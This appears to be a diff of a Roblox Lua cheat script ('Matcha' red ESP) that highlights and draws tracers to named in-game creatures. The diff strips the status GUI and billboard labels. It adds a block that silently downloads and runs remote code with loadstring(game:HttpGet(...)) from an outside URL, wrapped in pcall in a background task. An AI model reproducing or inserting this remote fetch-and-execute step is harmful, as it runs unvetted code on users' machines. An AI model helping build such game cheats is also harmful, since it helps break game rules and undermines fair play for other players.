@@ -1,9 +1,18 @@
--- Matcha.lua | ULTIMATE RED ESP (Tracers + Highlights + Auto)
+-- Matcha | ULTIMATE RED ESP + AUTO LOAD
 local env = (type(getgenv) == "function" and getgenv()) or _G
 if type(env.parl0vHubCleanup) == "function" then
     pcall(env.parl0vHubCleanup)
 end
- 
+
+-- 1. تحميل السكربت الخارجي (الذي ظهر في الـ Output)
+local externalUrl = "https://api.obscuravm.com/scripts/6417349026660614898"
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet(externalUrl))()
+    end)
+end)
+
+-- 2. نظام الـ ESP الأحمر التلقائي (الذي طلبته)
 local Players = game:GetService("Players")
 local Camera = workspace.CurrentCamera
 local targetNames = {
@@ -13,63 +22,32 @@ local targetNames = {
     ["ضب الحمى"] = true, ["الضب الفيروزي"] = true, ["الضب الصحراوي العادي"] = true,
     ["الضب الأخضر"] = true, ["ضب الحزم"] = true, ["ضب الشيح"] = true, ["ضب الغبار"] = true,
 }
- 
-local state = { alive = true, espItems = {}, count = 0, gui = nil, label = nil }
+
+local state = { alive = true, espItems = {} }
 local function safe(fn) local ok, res = pcall(fn) return ok and res or nil end
 local function destroyIfExists(instance) if instance then safe(function() instance:Destroy() end) end end
-
-local function createStatusGui()
-    local player = Players.LocalPlayer
-    local playerGui = player:WaitForChild("PlayerGui")
-    destroyIfExists(state.gui)
-    local gui = Instance.new("ScreenGui")
-    gui.Name = "MatchaRedStatus"
-    gui.ResetOnSpawn = false
-    gui.Parent = playerGui
-    state.gui = gui
-    local label = Instance.new("TextLabel")
-    label.Size = UDim2.new(0, 220, 0, 35)
-    label.Position = UDim2.new(0, 15, 0, 15)
-    label.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    label.BackgroundTransparency = 0.5
-    label.TextColor3 = Color3.fromRGB(255, 0, 0)
-    label.TextSize = 16
-    label.Font = Enum.Font.GothamBold
-    label.Text = "Matcha: Scanning... (0)"
-    label.BorderSizePixel = 2
-    label.BorderColor3 = Color3.fromRGB(255, 0, 0)
-    label.Parent = gui
-    state.label = label
-end
 
 local function applyEsp(obj, name)
     if state.espItems[obj] then return end
     local part = obj:IsA("Model") and (obj.PrimaryPart or obj:FindFirstChildWhichIsA("BasePart")) or (obj:IsA("BasePart") and obj)
     if not part then return end
+    
+    -- توهج أحمر
     local h = Instance.new("Highlight")
     h.FillColor = Color3.fromRGB(255, 0, 0)
     h.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
     h.Parent = obj
-    local b = Instance.new("BillboardGui")
-    b.Size = UDim2.new(0, 150, 0, 40)
-    b.AlwaysOnTop = true
-    b.Parent = part
-    local t = Instance.new("TextLabel")
-    t.Size = UDim2.fromScale(1, 1)
-    t.BackgroundTransparency = 1
-    t.Text = name
-    t.TextColor3 = Color3.fromRGB(255, 0, 0)
-    t.TextScaled = true
-    t.Font = Enum.Font.GothamBold
-    t.Parent = b
+    
+    -- خطوط تتبع حمراء (Tracers)
     local line = nil
-    if type(Drawing) ~= "nil" and Drawing.new then
+    if type(Drawing) ~= "nil" then
         line = Drawing.new("Line")
         line.Color = Color3.fromRGB(255, 0, 0)
         line.Thickness = 1.5
         line.Visible = false
     end
-    state.espItems[obj] = {h = h, b = b, line = line, part = part}
+    
+    state.espItems[obj] = {h = h, line = line, part = part}
 end
 
 local function updateTracers()
@@ -86,41 +64,33 @@ local function updateTracers()
         end
     end
 end
- 
+
 local function scan()
     local descendants = safe(function() return workspace:GetDescendants() end)
     if not descendants then return end
     local currentFound = {}
-    local foundCount = 0
     for _, obj in ipairs(descendants) do
         local objName = safe(function() return obj.Name end)
         if type(objName) == "string" and targetNames[objName] then
             currentFound[obj] = true
-            foundCount = foundCount + 1
             applyEsp(obj, objName)
         end
-    end
-    state.count = foundCount
-    if state.label then 
-        state.label.Text = "Matcha: Searching... (" .. tostring(foundCount) .. ")" 
-        state.label.BackgroundColor3 = foundCount > 0 and Color3.fromRGB(150, 0, 0) or Color3.fromRGB(0, 0, 0)
     end
     for oldObj, items in pairs(state.espItems) do
         if not currentFound[oldObj] or not oldObj.Parent then
             destroyIfExists(items.h)
-            destroyIfExists(items.b)
             if items.line then items.line:Remove() end
             state.espItems[oldObj] = nil
         end
     end
 end
- 
+
 env.parl0vHubCleanup = function() 
     state.alive = false 
-    destroyIfExists(state.gui)
     for _, items in pairs(state.espItems) do if items.line then items.line:Remove() end end
 end
- 
-safe(createStatusGui)
+
 task.spawn(function() while state.alive do scan() task.wait(2) end end)
 game:GetService("RunService").RenderStepped:Connect(function() if state.alive then updateTracers() end end)
+
+print("[Matcha] Ultimate Red ESP + External Script Loaded!")
